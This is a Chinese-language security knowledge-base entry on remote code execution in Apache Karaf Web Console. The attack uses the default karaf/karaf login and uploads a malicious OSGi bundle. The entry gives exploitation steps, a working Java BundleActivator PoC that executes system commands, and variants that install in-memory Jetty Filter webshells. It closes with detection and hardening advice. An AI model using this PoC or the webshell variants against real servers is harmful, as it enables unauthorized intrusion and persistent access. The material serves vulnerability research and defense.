---
id: web-java-component-karaf-webconsole-default-login-bundle-upload-rce
title: Apache Karaf Web Console 默认口令 + OSGi Bundle 上传：BundleActivator.start() 直接命令执行
type: scenario
domain: web
path: web/java/component
technique: karaf-webconsole-bundle-upload-rce
tags:
- java
- karaf
- osgi
- webconsole
- default-credentials
- bundle-upload
- rce
- jetty
- memshell
cve: []
severity: high
confidence: high
status: verified
affected_versions: Apache Karaf 4.0.4（原文测试版本）；原文称后台 Upload/Install Bundles RCE 为全版本功能
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V224
  verified_at: '2026-11-07T06:44:31+08:00'
  notes: 已对照 content.md 与 12/12 张图核对：8181 /system/console/、karaf/karaf 默认口令、Upload / Install Bundles 勾选 Start Bundle、Install.java 的 if(start) bundle.start()、恶意 BundleActivator 弹计算器与 AntSword/Jetty Filter 连接均与原文一致；版本标记保留原文 4.0.4 测试版本及“全版本后台 RCE”表述。与 Karaf HttpService Servlet 内存马卡 dup-scan 判定 related：前者为 bundle 上传直接命令执行，后者为 OSGi HttpService.registerServlet 内存马，前置相同但 sink/目标不同，保留两张。未验证点：PoC 未本机复跑；“全版本”为原文作者表述。
url: /docs/web/java/component/web-java-component-karaf-webconsole-default-login-bundle-upload-rce/
draft: false
kb_aliases:
- Apache Karaf 默认口令
- Karaf Web Console RCE
- Karaf bundle install RCE
- OSGi BundleActivator 命令执行
- karaf/karaf
---

## 一句话结论

Apache Karaf 的 Web Console（默认 8181 端口 `/system/console/`）在旧版本内置 `karaf/karaf` 默认口令，登录后在 `Upload / Install Bundles` 页面上传任意 OSGi bundle 并勾选 `Start Bundle`，`org.apache.karaf.bundle.command.Install` 会对每个 bundle 调用 `bundle.start()`，触发攻击者 JAR 中 `Bundle-Activator` 的 `start()`，从而以 Karaf 进程权限执行任意 Java 代码和系统命令。

## 原理

- Karaf 基于 OSGi，bundle 是带 OSGi 元数据的 JAR。`MANIFEST.MF` 中的 `Bundle-Activator` 指定一个实现 `org.osgi.framework.BundleActivator` 的类；OSGi 框架在 bundle 启动时实例化该类并调用 `start(BundleContext)`。
- Web Console 的 Bundles 页面提供 `Upload / Install Bundles`，其处理命令 `org.apache.karaf.bundle.command.Install` 的逻辑是：解析上传的 JAR，并可选地对安装后的 `Bundle` 执行 `bundle.start()`（页面上的 `Start Bundle` 复选框）。源码中 `if (start) { for (Bundle bundle : bundles) bundle.start(); }` 直接触发 activator，没有对 bundle 来源或行为做安全审查。
- 因此“上传 bundle”等价于“部署并执行任意 Java 代码”。攻击者只需一个合法 OSGi 元数据 + 恶意 `BundleActivator`，不需要任何反序列化/表达式注入 gadget。
- Web Console 的认证在旧版本使用内置 `karaf/karaf` 账号；如果目标未改口令或暴露在公网，攻击者可直接获得上传权限。较新版本把默认账号密码注释掉，要求管理员显式启用，从而限制默认安装被直接利用。

## 触发条件

- 目标暴露 Apache Karaf Web Console（常见 `http://host:8181/system/console/`），且 `webconsole` feature 已安装。
- 存在可用凭据：默认 `karaf/karaf`，或弱口令/泄露口令。
- 登录账号具有 bundle 安装权限（Karaf 管理账号默认具备）。
- 上传时勾选 `Start Bundle`（或上传后手动 start 该 bundle）。
- 目标 Karaf 进程运行用户可执行所需系统命令；Java 版本与新版本 Karaf 可能限制上传/启用账号。

## 利用步骤

1. 访问 `http://host:8181/system/console/`，用 `karaf/karaf` 登录（旧版本默认）。
2. 进入 `Bundles` 页面，点击 `Install/Update...` 打开 `Upload / Install Bundles`。
3. 勾选 `Start Bundle`，选择恶意 bundle JAR，点击 `Install or Update`。
4. Karaf 安装并启动 bundle，OSGi 框架调用 `BundleActivator.start()`，执行攻击者代码。
5. 命令执行/反弹 shell 成功后，可进一步在内存中注册 Servlet/Filter 维持访问，或读取 Karaf 配置、部署目录与凭据。

## PoC

恶意 bundle 的 activator：

```java
package com.blogspot.developmentor;

import org.osgi.framework.BundleActivator;
import org.osgi.framework.BundleContext;

public class Activator implements BundleActivator {
    public void start(BundleContext context) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String[] cmd = os.contains("win")
                ? new String[]{"cmd.exe", "/c", "calc"}
                : new String[]{"bash", "-c", "id"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void stop(BundleContext context) {}
}
```

`META-INF/MANIFEST.MF` 最小元数据：

```text
Manifest-Version: 1.0
Bundle-ManifestVersion: 2
Bundle-SymbolicName: com.blogspot.developmentor.activator
Bundle-Version: 1.0.0
Bundle-Activator: com.blogspot.developmentor.Activator
Import-Package: org.osgi.framework
```

用 Maven `maven-bundle-plugin` 或 `maven-jar-plugin` 打包后上传；测试环境中 bundle 启动成功并弹出计算器。

## 变体与关联

- 变体：在 `BundleActivator.start()` 中用 `sun.misc.Unsafe.defineClass`/`defineAnonymousClass` 加载内存中的字节码（如 jmg 生成的 AntSword Jetty Filter），不落盘 class；连接 Jetty 内存马时需带 Web Console 的认证头 `Authorization: Basic a2FyYWY6a2FyYWY=`。该环境里冰蝎/哥斯拉曾报 `NoClassDefFoundError: javax/crypto/Cipher`，蚁剑/Jetty Filter 可连通。
- 变体：用 OSGi `HttpService.registerServlet` 注册内存 Servlet WebShell，见 [[web-java-component-karaf-osgi-httpservice-servlet-memshell]]。
- 关联：[[web-java-classloader-unsafe-anonymous-class-jsp-shell]]（Unsafe 匿名类内存马原语）、[[web-java-component-jetty11-threadlocal-header-memshell]]（Jetty 容器内存马）、[[web-java-component-fastcms-plugin-upload-pf4j-start-rce]]（后台插件上传后调用 `start()` 执行代码的同类模式）。
- 边界：新版 Karaf 默认账号密码已被注释，需管理员显式启用后才可登录；默认口令不一定存在于所有版本/发行版；上传接口要求有效会话与管理权限。

## 检测与防御

- 检测：`/system/console/` 登录后短时间内访问 `Bundles` 并调用上传/安装接口；Karaf 日志出现新 bundle 安装、`Bundle-Activator` 启动、`bundle.start()`；进程出现 `Runtime.exec` 派生的 `cmd.exe`/`bash` 子进程；操作系统层面出现 Karaf 进程启动计算器、下载器或反弹 shell。
- 检测：比对 bundle 列表与基线，关注无签名、来源不明、`Bundle-Activator` 指向混淆类名的新 bundle；监控 Web Console 的 8181 访问与 Basic 认证失败/成功日志。
- 防御：修改/禁用默认 `karaf/karaf` 账号；不要把 8181 暴露到公网，使用反向代理 + 强认证 + 来源限制；新版 Karaf 保持默认账号注释状态并设置强口令；限制管理账号权限；对 bundle 做签名校验与来源白名单；生产环境关闭 Web Console 或仅内网开放。
- 加固：审计 Karaf 的 `etc/` 用户配置与 `system/` bundle 目录；对上传目录设只读/隔离；启用 Java 安全管理器或容器级最小权限；监控 Karaf 进程的系统调用与子进程。
